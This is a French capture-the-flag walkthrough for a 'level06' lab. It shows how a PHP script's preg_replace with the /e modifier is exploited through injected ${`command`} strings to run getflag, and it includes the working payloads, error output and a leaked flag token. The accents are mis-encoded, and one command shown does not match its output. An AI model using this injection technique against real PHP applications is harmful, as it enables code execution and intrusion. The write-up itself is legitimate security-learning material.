$ ls -la
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
On trouve un script php et un binaire

$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

Le binaire execute le script php et le script semble avoir besoin d un argument

$ ./level06 bonjour
PHP Warning:  file_get_contents(bonjour): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4

L'argument semble devoir etre un fichier

Voici une version du script php comment√©e et simplifi√©e par nos soins:

	<?php
		function y($param) {
			return $param;
		}

		function foo($param1) {
    		// Le contenu du fichier sp√©cifi√© par $param1 est lu dans la variable $str
    		$str = file_get_contents($param1);

    		// Trouve [x ...] dans $str et remplace par le r√©sultat de la fonction bar(...)
				$str = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $str);

    		return $str;
		}

		$r = foo($argv[1]);
		print $r;
	?>

Ce script lit le contenu du fichier donn√© en premier argument, remplace certains patterns √† l'aide de regexes et
print le contenu modifi√©

La ligne qu'on peut exploiter est la suivante :

	$str = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $str);

Tout d'abord, le modifier /e √† la fin du regex re√ßu en premier param√®tre de preg_replace()
lui fait √©valuer la string de remplacement re√ßue en second param√®tre comme du code php !
Le jeu est donc de trouver comment arriver √† faire en sorte que php √©x√©cute /bin/getflag

Si on analyse le regex : La string de remplacement fait appel √† la fonction y de telle mani√®re √† ce que [x *] devienne y("*")
o√π * peut √™tre n'importe quoi.

L'id√©al serait de pouvoir un appel direct √† system('/bin/getflag') mais malheureusement ce que nous sommes
en mesure d'injecter est solidemment encadr√© par des double quotes --> y("system(/bin/getflag)")
Heureusement, php supporte le string interpolation avec ${} !
	
	$ php << 'EOF'
		<?php
			print "On va exec ls en soum-soum hehe ${system('/bin/ls')}";
		?>
	EOF

Malheureusement √ßa ne peut pas marcher non plus dans notre cas car la string remplacement escape la premi√®re lettre de notre injection (\\2)
apparemment

[x ${system('/bin/getflag')}] --> y("\${system('/bin/getflag')}")

P√©nible. Peut √™tre que du coup...

[x phpbedamned ${system('/bin/getflag')}] --> ?

PHP Parse error:  syntax error, unexpected '(' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code:
y("phpbedamned ${system(\'/bin/getflag\')}") in /home/user/level06/level06.php on line 4

üòí
Ok l√† j'avoue que je comprends pas, pourquoi php nous escape nos single-quotes ?

Heureusement la solution nous appara√Æt dans un r√™ve.
Il nous est r√©v√©l√©e que php, comme bash, supporte la syntaxe avec les backquotes, pour √©x√©cuter des commandes

Essayons :

[x phpbedamned ${`/bin/ls`)}]

PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

D'ailleurs, √ßa aussi √ßa marche... 

[x ${`/bin/ls`)}]

On peut pas dire qu'on a compris toutes les r√®gles de l'escaping de php mais on est content de passer 
enfin au niveau suivant
